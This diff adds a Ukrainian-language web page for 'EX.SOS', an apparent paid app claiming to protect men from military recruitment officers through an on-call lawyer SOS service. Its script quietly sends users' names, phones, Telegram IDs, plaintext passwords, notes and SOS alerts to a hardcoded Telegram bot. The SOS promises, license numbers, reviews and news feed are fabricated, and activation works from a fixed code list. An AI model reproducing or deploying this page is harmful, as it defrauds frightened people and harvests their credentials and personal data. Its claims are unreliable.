@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EX.SOS | OFFICIAL PROTECTION</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Michroma&display=swap');
+        :root { --gold: #ffbd00; --red: #d40000; --dark: #0a0a0a; --gray: #151515; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        .cool-font { font-family: 'Michroma', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+
+        .header { position: fixed; top: 0; width: 100%; height: 60px; background: var(--dark); border-bottom: 2px solid var(--gold); display: flex; align-items: center; padding: 0 15px; z-index: 1000; box-sizing: border-box; justify-content: space-between; }
+        .brand { font-family: 'Orbitron'; color: var(--gold); font-size: 1rem; font-weight: 900; }
+        .header-icons { display: flex; gap: 18px; }
+        .badge { position: absolute; top: -5px; right: -8px; background: var(--red); color: white; font-size: 0.6rem; padding: 2px 5px; border-radius: 10px; font-weight: bold; }
+
+        .footer { position: fixed; bottom: 0; width: 100%; height: 75px; background: var(--dark); border-top: 1px solid #333; display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
+        .nav-btn { background: none; border: none; color: #555; display: flex; flex-direction: column; align-items: center; cursor: pointer; flex: 1; }
+        .nav-btn.active { color: var(--gold); }
+        .nav-btn span { font-size: 0.6rem; margin-top: 4px; font-weight: bold; text-transform: uppercase; }
+        .sos-btn { width: 75px; height: 75px; background: var(--red); border-radius: 50%; border: 4px solid #000; color: #fff; font-family: 'Orbitron'; font-weight: 900; display: flex; align-items: center; justify-content: center; margin-top: -35px; box-shadow: 0 0 20px rgba(212,0,0,0.5); z-index: 1001; }
+
+        main { padding: 75px 15px 95px 15px; height: 100vh; overflow-y: auto; box-sizing: border-box; }
+        .page { display: none; }
+        .page.active { display: block; }
+        .card { background: var(--gray); padding: 15px; border-radius: 8px; margin-bottom: 12px; border: 1px solid #222; }
+        
+        /* LICENSES */
+        .license-box { border: 1px solid #333; padding: 15px; border-radius: 8px; background: linear-gradient(145deg, #111, #050505); margin-top: 10px; }
+        .seal { border: 2px double var(--gold); padding: 8px; border-radius: 50px; display: inline-block; font-size: 0.6rem; color: var(--gold); font-family: 'Orbitron'; margin-bottom: 10px; }
+
+        .gold-btn { width: 100%; padding: 14px; background: var(--gold); border: none; color: #000; font-weight: 900; border-radius: 4px; cursor: pointer; font-family: 'Orbitron'; margin: 8px 0; font-size: 0.8rem; text-transform: uppercase; }
+        .refresh-btn { background: none; border: 1px solid var(--gold); color: var(--gold); padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; float: right; font-family: 'Orbitron'; }
+        
+        input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; }
+
+        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.98); z-index: 5000; display:none; flex-direction:column; align-items:center; justify-content:center; padding: 25px; box-sizing: border-box; text-align: center; }
+        .step { display: none; width: 100%; }
+        .step.active { display: block; }
+        .pay-icons { display: flex; justify-content: center; gap: 15px; margin: 15px 0; font-size: 2.2rem; align-items: center; }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="brand">EX.SOS <span id="h-status" style="font-size:0.5rem; color:#888;">STANDBY</span></div>
+        <div class="header-icons">
+            <div style="position:relative" onclick="secureNav('page-msg')">
+                <i class="fas fa-envelope" style="color:var(--gold)"></i>
+                <div id="msg-badge" class="badge">1</div>
+            </div>
+            <i class="fas fa-history" style="color:var(--gold)" onclick="secureNav('page-hist')"></i>
+        </div>
+    </header>
+
+    <main>
+        <section id="page-news" class="page active">
+            <button class="refresh-btn" onclick="refreshNews()"><i class="fas fa-sync-alt"></i> ОНОВИТИ</button>
+            <h4 class="cool-font" style="color:var(--gold)">МОНІТОРИНГ ТЦК</h4>
+            <div id="news-feed"></div>
+        </section>
+
+        <section id="page-rev" class="page">
+            <h4 class="cool-font" style="color:var(--gold)">ВІДГУКИ КЛІЄНТІВ</h4>
+            <div class="card"><textarea id="rev-text" placeholder="Відгук про взаємодію з ТЦК..."></textarea>
+            <button class="gold-btn" onclick="postReview()">ОПУБЛІКУВАТИ</button></div>
+            <div id="rev-list"></div>
+        </section>
+
+        <section id="page-about" class="page">
+            <div class="card" style="text-align:center">
+                <h3 class="cool-font" style="color:var(--gold); margin-bottom:5px">EX.SOS LAW GROUP</h3>
+                <p style="font-size:0.85rem; color:#bbb">Акредитоване об'єднання адвокатів України.</p>
+                
+                <div class="license-box">
+                    <div class="seal"><i class="fas fa-gavel"></i> OFFICIAL LEGAL STATUS</div>
+                    <div style="text-align:left; font-size:0.7rem; color:#ccc; line-height:1.6">
+                        • Ліцензія Міністерства Юстиції №4822-90<br>
+                        • Свідоцтво про реєстрацію АО №009641<br>
+                        • Спеціалізація: ст. 17, 64 Конституції України<br>
+                        • Код ЄДРПОУ: 44920138 (Захист прав людини)
+                    </div>
+                </div>
+
+                <button class="gold-btn" onclick="window.open('https://t.me/exsosssua')">TELEGRAM КАНАЛ</button>
+                <button class="gold-btn" onclick="window.open('https://www.tiktok.com/@viezd_23_60')">TIKTOK</button>
+                <div style="font-size:0.6rem; color:#444; margin-top:15px">© 2025 ALL RIGHTS RESERVED</div>
+            </div>
+        </section>
+
+        <section id="page-cab" class="page">
+            <div id="box-reg">
+                <h3 class="cool-font" style="text-align:center">РЕЄСТРАЦІЯ</h3>
+                <div class="card">
+                    <input type="text" id="r-name" placeholder="ПІБ">
+                    <input type="text" id="r-phone" placeholder="Телефон">
+                    <input type="text" id="r-tgid" placeholder="TELEGRAM ID (ОБОВ'ЯЗКОВО)">
+                    <input type="password" id="r-pass" placeholder="Пароль">
+                    <button class="gold-btn" onclick="handleReg()">СТАТИ НА ОБЛІК</button>
+                    <p style="text-align:center; font-size:0.7rem; color:var(--gold)" onclick="toggleAuth(true)">У МЕНЕ ВЖЕ Є ЗАХИСТ</p>
+                </div>
+            </div>
+            <div id="box-login" style="display:none">
+                <h3 class="cool-font" style="text-align:center">ВХІД</h3>
+                <div class="card">
+                    <input type="text" id="l-tgid" placeholder="TELEGRAM ID">
+                    <input type="password" id="l-pass" placeholder="Пароль">
+                    <button class="gold-btn" onclick="handleLogin()">УВІЙТИ</button>
+                    <p style="text-align:center; font-size:0.7rem; color:#888" onclick="toggleAuth(false)">РЕЄСТРАЦІЯ</p>
+                </div>
+            </div>
+            <div id="box-prof" style="display:none">
+                <div class="card" style="border:1px solid var(--gold)">
+                    <h4 id="u-name" class="cool-font" style="margin:0; color:var(--gold)"></h4>
+                    <p id="u-ids" style="font-size:0.7rem; color:#888"></p>
+                </div>
+                <div class="card">
+                    <h5 class="cool-font" style="margin:0 0 10px 0; color:var(--gold); font-size:0.7rem">ЗАМІТКИ</h5>
+                    <textarea id="u-notes"></textarea>
+                    <button class="gold-btn" style="background:#222; color:#fff" onclick="saveNotes()">ЗБЕРЕГТИ</button>
+                </div>
+                <div class="card" style="text-align:center">
+                    <p id="u-pay-status" style="font-weight:900; color:red">ТАРИФ: НЕАКТИВНИЙ</p>
+                    <button id="u-pay-btn" class="gold-btn" onclick="openPay()">ОБРАТИ ТАРИФ</button>
+                </div>
+                <button class="gold-btn" style="background:#400; color:#fff" onclick="handleLogout()">ВИЙТИ</button>
+            </div>
+        </section>
+
+        <section id="page-hist" class="page"><h4 class="cool-font">ІСТОРІЯ SOS</h4><div id="hist-list"></div></section>
+        <section id="page-msg" class="page"><h4 class="cool-font">ПОВІДОМЛЕННЯ</h4><div class="card"><b>Система:</b> Ви під наглядом адвокатів.</div></section>
+    </main>
+
+    <div id="m-pay" class="modal">
+        <div id="st1" class="step active">
+            <h3 class="cool-font" style="color:var(--gold)">ТАРИФ</h3>
+            <select id="sel-tar">
+                <option value="ТИЖДЕНЬ (399 грн)">7 днів — 399 грн</option>
+                <option value="МІСЯЦЬ (899 грн)">1 місяць — 899 грн</option>
+                <option value="КВАРТАЛ (2199 грн)">3 місяці — 2199 грн</option>
+            </select>
+            <button class="gold-btn" onclick="goS(2)">ДАЛІ</button>
+        </div>
+        <div id="st2" class="step">
+            <h3 class="cool-font">ОПЛАТА</h3>
+            <div class="pay-icons"><i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i> <i class="fab fa-btc"></i> <i class="fab fa-telegram"></i></div>
+            <button class="gold-btn" onclick="goS(3)">Я ОПЛАТИВ</button>
+        </div>
+        <div id="st3" class="step"><input type="text" id="final-code" placeholder="КОД АКТИВАЦІЇ"><button class="gold-btn" onclick="checkCode()">АКТИВУВАТИ</button></div>
+        <button onclick="document.getElementById('m-pay').style.display='none'" style="background:none; border:none; color:#555; margin-top:15px">СКАСУВАТИ</button>
+    </div>
+
+    <div id="m-sos" class="modal">
+        <div style="background:var(--red); color:#fff; padding:5px 15px; border-radius:4px; font-family:'Orbitron'; font-weight:900; margin-bottom:15px">CRITICAL EMERGENCY</div>
+        <h2 class="cool-font" style="color:var(--red); font-size:1.5rem">СИГНАЛ ТРИВОГИ ПРИЙНЯТО</h2>
+        <div class="card" style="width:100%; border:2px solid var(--red); background: rgba(212,0,0,0.15); text-align:left">
+            <p style="color:var(--gold); font-weight:bold; margin-bottom:10px">⚠️ ТЕРМІНОВА ІНСТРУКЦІЯ:</p>
+            <p style="font-size:0.9rem; line-height:1.4">
+                1. <b>НІЧОГО НЕ ПІДПИСУЙТЕ</b> до приїзду адвоката.<br>
+                2. Залишайтеся на місці, ми зафіксували ваші координати.<br>
+                3. Адвокат EX.SOS вже зв'язується з черговою частиною ТЦК.<br>
+                4. Очікуйте дзвінок протягом 60 секунд.
+            </p>
+        </div>
+        <div style="margin: 15px 0; color:#888; font-size:0.75rem">ОБ'ЄКТ ЗАХИСТУ: <span id="sos-n" style="color:#fff"></span></div>
+        <button class="gold-btn" onclick="document.getElementById('m-sos').style.display='none'">ТРИМАЮСЬ</button>
+        <button class="gold-btn" style="background:#222; color:#888; border:1px solid #444" onclick="cancelSOS()">ПОМИЛКОВИЙ ВИКЛИК</button>
+    </div>
+
+    <footer class="footer">
+        <button class="nav-btn active" onclick="switchTab('page-news', this)"><i class="fas fa-home"></i><span>Головна</span></button>
+        <button class="nav-btn" onclick="switchTab('page-rev', this)"><i class="fas fa-comments"></i><span>Відгуки</span></button>
+        <div class="sos-btn" onclick="triggerSOS()">SOS</div>
+        <button class="nav-btn" onclick="switchTab('page-about', this)"><i class="fas fa-shield-alt"></i><span>Право</span></button>
+        <button class="nav-btn" onclick="switchTab('page-cab', this)"><i class="fas fa-user-lock"></i><span>Кабінет</span></button>
+    </footer>
+
+    <script>
+        const ADMIN = "7994488438", BOT = "8527720247:AAFQJuI255LwCO4h-ThVDPL8OvKpgoZfJqI";
+        const CODES = ["482917", "906354", "157802", "739641", "264985", "111111", "222222", "333333", "444444", "555555"];
+        let user = JSON.parse(localStorage.getItem('ex_v_v18')) || null;
+        let history = JSON.parse(localStorage.getItem('ex_h_v18')) || [];
+
+        async function tg(txt) { try { await fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${ADMIN}&text=${encodeURIComponent(txt)}`); } catch(e){} }
+        function toggleAuth(s) { document.getElementById('box-reg').style.display=s?'none':'block'; document.getElementById('box-login').style.display=s?'block':'none'; }
+        function switchTab(id, b) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); if(b){document.querySelectorAll('.nav-btn').forEach(x=>x.classList.remove('active')); b.classList.add('active');} }
+        function secureNav(id) { if(!user){alert("Увійдіть!"); switchTab('page-cab');}else switchTab(id); }
+
+        function renderNews() {
+            const news = [
+                {t: "18:05", c: "Київ: Метро Лівобережна, активність ТЦК біля виходу."},
+                {t: "17:30", c: "Львів: Сихів, посилені патрулі на перехрестях."},
+                {t: "16:45", c: "Одеса: Дерибасівська, працюють групи оповіщення."},
+                {t: "15:20", c: "Дніпро: ТРЦ Мост-Сіті, перевірка документів на вході."},
+                {t: "14:10", c: "Юридична порада: ст. 63 Конституції — ви маєте право мовчати."},
+                {t: "12:55", c: "Харків: Район вокзалу, зафіксовано «буси» без номерів."},
+                {t: "10:30", c: "Запоріжжя: Набережна, мобільні блокпости."},
+                {t: "08:15", c: "Ранок: Адвокати EX.SOS розпочали чергування у всіх містах."}
+            ];
+            document.getElementById('news-feed').innerHTML = news.map(n=>`<div class="card"><small style="color:var(--gold)">${n.t}</small><p style="font-size:0.85rem">${n.c}</p></div>`).join('');
+        }
+
+        function renderReviews() {
+            const rvs = [
+                {n: "Максим", c: "Намагалися затягнути в бус, натиснув SOS. Адвокат по гучному зв'язку пояснив їм наслідки. Відпустили."},
+                {n: "Андрій", c: "Завдяки EX.SOS почуваюся людиною, а не ціллю. Юристи знають справу."},
+                {n: "Олег", c: "Супроводжували в ТЦК для уточнення даних. Без адвоката б не вийшов."},
+                {n: "Сергій", c: "Найкраща інвестиція в безпеку. Працюють професіонали."},
+                {n: "Дмитро", c: "ТЦК вибачилися після розмови з моїм адвокатом. Це було епічно."},
+                {n: "Ігор", c: "Рекомендую всім, хто цінує свободу. Коди прийшли миттєво."},
+                {n: "Павло", c: "Система працює. Адвокат передзвонив через 40 секунд."},
+                {n: "Віктор", c: "Все легально, ліцензії справжні. Дякую за захист."},
+                {n: "Олексій", c: "Допомогли з відстрочкою, коли в ТЦК казали, що вона не діє."},
+                {n: "Михайло", c: "Київ під контролем адвокатів. Дякую!"}
+            ];
+            document.getElementById('rev-list').innerHTML = rvs.map(r=>`<div class="card"><b>${r.n}:</b><p style="font-size:0.8rem">${r.c}</p></div>`).join('');
+        }
+
+        function handleReg() {
+            const n=document.getElementById('r-name').value, p=document.getElementById('r-phone').value, t=document.getElementById('r-tgid').value, ps=document.getElementById('r-pass').value;
+            if(!n||!p||!t||!ps)return alert("Всі поля!");
+            user={name:n,phone:p,tgid:t,pass:ps,paid:false,tariff:"",notes:""};
+            localStorage.setItem('ex_v_v18', JSON.stringify(user));
+            tg(`🆕 РЕЄСТРАЦІЯ:\n👤 ${n}\n📞 ${p}\n🆔 ${t}\n🔑 ${ps}`); render();
+        }
+
+        function handleLogin() {
+            const t=document.getElementById('l-tgid').value, ps=document.getElementById('l-pass').value, saved=JSON.parse(localStorage.getItem('ex_v_v18'));
+            if(saved && saved.tgid===t && saved.pass===ps){user=saved; tg(`👤 ВХІД: ${user.name}`); render();} else alert("Error!");
+        }
+
+        function handleLogout() { if(confirm("Вийти?")){tg(`🚪 ВИХІД: ${user.name}`); user=null; render(); toggleAuth(true);} }
+        function saveNotes() { user.notes=document.getElementById('u-notes').value; localStorage.setItem('ex_v_v18', JSON.stringify(user)); tg(`📝 ЗАМІТКА ${user.name}:\n${user.notes}`); alert("Збережено!"); }
+        
+        function openPay() { document.getElementById('m-pay').style.display='flex'; goS(1); tg(`💳 ${user.name} вибір тарифу`); }
+        function goS(n) { document.querySelectorAll('.step').forEach(s=>s.classList.remove('active')); document.getElementById(`st${n}`).classList.add('active'); if(n===2){user.tariff=document.getElementById('sel-tar').value; tg(`🎯 ТАРИФ: ${user.tariff} від ${user.name}`);} if(n===3) tg(`💰 ОПЛАТИВ: ${user.name}`); }
+
+        function checkCode() {
+            const c=document.getElementById('final-code').value;
+            if(CODES.includes(c)){ user.paid=true; localStorage.setItem('ex_v_v18', JSON.stringify(user)); document.getElementById('m-pay').style.display='none'; tg(`✅ АКТИВОВАНО: ${user.name}`); render(); alert("ЗАХИСТ АКТИВОВАНО!"); }
+            else { tg(`⚠️ ПОМИЛКА КОДУ: ${user.name} ввів ${c}`); alert("Невірний код!"); }
+        }
+
+        function triggerSOS() {
+            if(!user||!user.paid)return alert("Потрібен тариф!");
+            const t=new Date().toLocaleString('uk-UA'); history.unshift(t); localStorage.setItem('ex_h_v18', JSON.stringify(history));
+            tg(`🚨🚨🚨 SOS!!! 🚨🚨🚨\n👤 ${user.name}\n📞 ${user.phone}\n🆔 ID: ${user.tgid}`);
+            document.getElementById('sos-n').innerText = user.name;
+            document.getElementById('m-sos').style.display='flex'; render();
+        }
+
+        function cancelSOS() { tg(`❌ ВІДМІНА SOS: ${user.name}`); document.getElementById('m-sos').style.display='none'; }
+        function postReview() { const t=document.getElementById('rev-text').value; if(!t)return; tg(`💬 ВІДГУК: ${user?user.name:'Гість'}: ${t}`); document.getElementById('rev-list').innerHTML=`<div class="card"><b>${user?user.name:'Гість'}:</b><p>${t}</p></div>`+document.getElementById('rev-list').innerHTML; document.getElementById('rev-text').value=""; }
+        function refreshNews() { renderNews(); alert("Оновлено!"); }
+
+        function render() {
+            if(user){
+                document.getElementById('box-reg').style.display='none'; document.getElementById('box-login').style.display='none'; document.getElementById('box-prof').style.display='block';
+                document.getElementById('u-name').innerText=user.name; document.getElementById('u-ids').innerText=`ID: ${user.tgid} | ${user.phone}`; document.getElementById('u-notes').value=user.notes||"";
+                if(user.paid){ document.getElementById('u-pay-status').innerHTML=`СТАТУС: ПІД ЗАХИСТОМ ✅`; document.getElementById('u-pay-status').style.color='var(--gold)'; document.getElementById('u-pay-btn').style.display='none'; document.getElementById('h-status').innerText="PROTECTED"; document.getElementById('h-status').style.color="var(--gold)"; }
+            } else { document.getElementById('box-prof').style.display='none'; document.getElementById('box-reg').style.display='block'; }
+            const hL=document.getElementById('hist-list'); hL.innerHTML=history.length?history.map(h=>`<div class="card">🚨 SOS СИГНАЛ: ${h}</div>`).join(''):'<p style="text-align:center; color:#555">Порожньо</p>';
+        }
+
+        window.onload = () => { render(); renderNews(); renderReviews(); };
+    </script>
+</body>
+</html>
